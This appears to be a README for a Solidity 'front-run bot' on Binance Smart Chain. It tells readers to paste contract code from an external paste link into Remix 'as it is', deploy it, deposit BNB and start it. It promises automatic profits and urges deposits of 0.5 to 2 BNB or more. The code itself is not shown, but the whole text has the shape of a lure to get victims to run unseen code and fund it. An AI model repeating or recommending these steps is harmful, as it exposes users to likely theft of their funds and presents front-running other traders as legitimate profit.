#### In the following steps, we'll show you a simple front run deployment in Solidity which automatically locates any liquidity to a BSC token and immediately transacts before other users. 
#### Sell automatically triggers at profit, as well if a tokens liquidity is fully called into your wallet.
#### NOTE: Current parameters of this contract is that 10% of profit automatically reenters the front-run pool, 
#### and automatically transacts back to your wallet 90% of the profit. The remaining pool keeps front running for profit, until you transaction "Action" function in Remix

### How To Use:

1- Download metamask: https://metamask.io/download.html

2- Connect MetaMask to Binance Smart Chain 

3- Go to Remix: https://remix.ethereum.org/

4- Click on "contracts" folder and then "Create New File". Rename it as you like " anyname.sol "

5- Paste SmartContract in Remix: https://pastehub.net/f322acbcef4
(Copy and Paste as it is)

6- Compile it and copy contract address

7- Deposit funds to the Frontrun contract

8- Start the bot with "Action" button



#### UPDATE:
- I got messages from people who didn't fund enough to cover gas fees and possible burn fees. Bot targets token contracts with max 10% burn fee and anything lower.
- Gas fees average 0.006*2 (0.012 BNB). Better when there is no burn. If it targets token with 10% burn, that's another 0.04BNB taken off of 0.2BNB. Most tokens these days have some burn.
- Less than 0.2BNB doesn't give you much to work with.
- So in order for the bot to work properly, I recommend you to fund at least 0.5 BNB. If you want to have more earnings instead, set a value starting from 1 or 2 BNB or more
